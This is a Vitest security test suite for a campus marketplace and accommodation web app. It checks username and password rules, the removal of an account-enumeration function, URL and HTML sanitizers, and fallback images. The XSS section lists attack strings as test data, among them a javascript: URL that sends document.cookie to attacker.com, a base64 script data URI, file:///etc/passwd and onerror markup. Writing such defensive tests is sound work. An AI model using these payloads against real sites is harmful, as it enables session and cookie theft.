import { describe, it, expect } from 'vitest';
import fs from 'node:fs';
import path from 'node:path';
import { isSafeUrl, htmlToMarkdown } from '../lib/messageFormat';
import { getProductFallbackImage } from '../marketplace/components/ProductCard';
import { getAccommodationFallbackImage, ACCOMMODATION_TYPE_FALLBACKS } from '../lib/accommodation';
import { USERNAME_PATTERN, normalizeUsername, validatePasswordPolicy } from '../lib/AuthContext';

describe('FUW Campus Hub - Authorized Penetration Test Suite & Security Invariants', () => {
  describe('1. Authentication & Identifier Security (OWASP ASVS 2.1)', () => {
    it('ASVS 2.1.1: Username normalization and regex prevents path injection or spoofing', () => {
      expect(normalizeUsername('  Student.01 ')).toBe('student.01');
      expect(USERNAME_PATTERN.test('../admin')).toBe(false);
      expect(USERNAME_PATTERN.test('user<script>')).toBe(false);
      expect(USERNAME_PATTERN.test('admin@fuw')).toBe(false);
      expect(USERNAME_PATTERN.test('valid_user-99')).toBe(true);
    });

    it('ASVS 2.1.7: Strict password complexity enforcement', () => {
      expect(validatePasswordPolicy('weak')).not.toBeNull();
      expect(validatePasswordPolicy('alllowercase123!')).not.toBeNull();
      expect(validatePasswordPolicy('ALLUPPERCASE123!')).not.toBeNull();
      expect(validatePasswordPolicy('NoSpecialChar123')).not.toBeNull();
      expect(validatePasswordPolicy('NoNumber!@#Abc')).not.toBeNull();
      expect(validatePasswordPolicy('FuwCampus#2026!')).toBeNull();
    });

    it('ASVS 2.1.12: Neutral response on password recovery prevents account enumeration', () => {
      const dropMigrationPath = path.resolve(__dirname, '../../supabase/migrations/20261007120000_drop_verify_account_for_reset.sql');
      expect(fs.existsSync(dropMigrationPath)).toBe(true);
      const sql = fs.readFileSync(dropMigrationPath, 'utf8');
      expect(sql).toContain('REVOKE EXECUTE ON FUNCTION public.verify_account_for_reset(text)');
      expect(sql).toContain('DROP FUNCTION IF EXISTS public.verify_account_for_reset(text)');
    });
  });

  describe('2. Input Sanitization & Cross-Site Scripting Defense (OWASP ASVS 5.1)', () => {
    it('Blocks dangerous URI schemes and script execution payloads', () => {
      const attackVectors = [
        'javascript:alert("XSS")',
        'JAVASCRIPT:document.location="http://attacker.com/steal?"+document.cookie',
        'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
        'vbscript:msgbox("xss")',
        'file:///etc/passwd',
        'javascript://%0aalert(1)'
      ];

      for (const vector of attackVectors) {
        expect(isSafeUrl(vector)).toBe(false);
      }
    });

    it('Allows legitimate academic and contact URIs', () => {
      expect(isSafeUrl('https://fuwukari.edu.ng/library')).toBe(true);
      expect(isSafeUrl('mailto:admissions@fuwukari.edu.ng')).toBe(true);
      expect(isSafeUrl('tel:+2348001234567')).toBe(true);
    });

    it('Strips malicious script tags and inline events from rich paste content', () => {
      const dirtyHtml = '<p>Study Handout <script>evil()</script><img src="x" onerror="steal()" /></p>';
      const sanitized = htmlToMarkdown(dirtyHtml);
      expect(sanitized).not.toContain('<script>');
      expect(sanitized).not.toContain('onerror');
      expect(sanitized).toContain('Study Handout');
    });
  });

  describe('3. Resilient Media & Fallback Architecture (Human Design Pass)', () => {
    it('Provides authentic category-specific fallback imagery for marketplace items', () => {
      const academicItem = getProductFallbackImage({ title: 'MTH 101 Lecture Handout', category_slug: 'books' });
      expect(academicItem).toContain('images.unsplash.com');

      const techItem = getProductFallbackImage({ title: 'Casio Scientific Calculator FX-991EX', category_slug: 'electronics' });
      expect(techItem).toContain('images.unsplash.com');

      const serviceItem = getProductFallbackImage({ title: 'Campus Laundry & Ironing', is_service: true });
      expect(serviceItem).toContain('images.unsplash.com');

      const mealItem = getProductFallbackImage({ title: 'Hot Jollof Rice with Chicken', category_slug: 'food' });
      expect(mealItem).toContain('images.unsplash.com');
    });

    it('Provides authentic student lodge fallback imagery across accommodation types', () => {
      const types = ['self_contained', 'single_room', 'flat_apartment', 'bedspace', 'shared_room'];
      for (const type of types) {
        const url = getAccommodationFallbackImage(type);
        expect(url).toContain('images.unsplash.com');
        expect(ACCOMMODATION_TYPE_FALLBACKS[type]).toBeDefined();
      }
    });
  });
});
